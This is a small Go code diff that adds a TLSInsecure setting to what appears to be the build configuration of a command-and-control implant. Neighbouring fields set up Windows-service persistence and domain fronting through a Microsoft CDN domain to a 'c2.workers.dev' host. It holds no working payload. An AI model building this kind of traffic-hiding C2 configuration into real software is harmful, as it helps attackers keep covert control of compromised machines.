@@ -14,4 +14,5 @@ var (
 	RunAsService  = ""          // Set to "true" to run as Windows service
 	FrontDomain   = ""          // CDN domain for SNI-based domain fronting (e.g., "cdn.microsoft.com")
 	HostHeader    = ""          // Override HTTP Host header for domain fronting (e.g., "c2.workers.dev")
+	TLSInsecure   = ""          // Set "true" to disable TLS cert verification (self-signed C2)
 )
